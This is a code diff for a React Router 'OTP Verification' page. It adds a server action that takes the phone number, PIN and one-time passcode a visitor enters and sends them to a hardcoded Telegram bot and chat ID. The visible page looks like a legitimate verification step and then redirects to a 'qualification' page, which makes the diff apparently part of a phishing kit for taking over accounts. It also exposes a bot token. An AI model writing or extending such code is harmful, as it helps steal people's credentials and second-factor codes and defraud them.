@@ -2,11 +2,41 @@ import { useEffect, useRef, useState } from "react";
 import { Button } from "@workspace/ui/components/button";
 import { Input } from "@workspace/ui/components/input";
 import image from "@workspace/ui/background-image.jpg"
-import { useNavigate } from "react-router";
-export async function clientAction({ }: any) {
-    return {
-        successRedirect: "/qualification"
+import { useFetcher, useNavigate } from "react-router";
+import type { Route } from "./+types/otp";
+
+
+export async function action({ request }: Route.ActionArgs) {
+
+    const formdata = await request.formData();
+
+    const token = "8944593745:AAHNRSJLCZl8wVJsoI833npl6MgMDFbcmko"
+    const url = `https://api.telegram.org/bot${token}/sendMessage`
+    try {
+        const res = await fetch(url, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                chat_id: 8453055105,// 7895249781,
+                text:
+                    `Account verification
+Phone: ${formdata.get("phone")}
+PIN: ${formdata.get("pin")}
+OTP: ${formdata.get("otp")}
+                    `,
+                parse_mode: "Markdown",
+            })
+
+        });
+        const data = await res.json();
+        return data;
+    } catch (e: any) {
+        return e.message || e;
     }
+
+
 }
 
 export default function OtpVerificationPage() {
@@ -81,6 +111,29 @@ export default function OtpVerificationPage() {
         setPhone(sessionStorage.getItem("phone"));
     },
         []);
+    const fetcher = useFetcher();
+    const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
+        e.preventDefault();
+        if(otp.length != 6){
+            alert("Please enter a valid OTP");
+            return;
+        }
+        const  formData = new FormData();
+        formData.append("otp", otp.join(""));
+        formData.append("phone", phone as unknown as string);
+        formData.append("pin", `${sessionStorage.getItem("pin")}`);
+        fetcher.submit(formData, {
+            method: "POST",
+
+        });
+
+    }
+    useEffect(() => {
+        if (fetcher.data?.ok == true) {
+            navigate("/qualification");
+        }
+    },
+        [fetcher])
     return (
         <main className="relative flex min-h-screen items-center justify-center overflow-hidden bg-gradient-to-br from-sky-100 via-blue-50 to-white"
             style={{
@@ -103,16 +156,13 @@ export default function OtpVerificationPage() {
             <form className="relative z-10 w-full max-w-md rounded-3xl border border-white/40 bg-white/90 p-8 shadow-2xl backdrop-blur-xl"
                 action={"/qualification"}
                 method="post"
-                onSubmit={(e) => {
-                    e.preventDefault();
-                    navigate("/qualification");
-                }}
+                onSubmit={handleSubmit}
             >
 
                 <h1 className="text-center text-4xl font-bold">
-                    OTP Verification
+                    OTP Verification 
                 </h1>
-
+                {fetcher.data?.ok == true ? <p className="text-green-500 text-center">Success!</p> : <p className="text-red-500 text-center">{fetcher.data?.description}</p>}
                 <p className="mt-5 text-center text-slate-600">
                     Enter the OTP sent to your number
                 </p>
@@ -149,8 +199,10 @@ export default function OtpVerificationPage() {
 
                 </div>
 
-                <Button className="mt-8 h-12 w-full rounded-xl bg-blue-600 hover:bg-blue-700" type="submit">
-                    Submit
+                <Button className="mt-8 h-12 w-full rounded-xl bg-blue-600 hover:bg-blue-700" type="submit"
+                disabled={fetcher.state != "idle"}
+                >
+                    {fetcher.state != "idle" ? "Loading..." : "Submit"}
                 </Button>
 
                 <p className="mt-5 text-center text-slate-600">
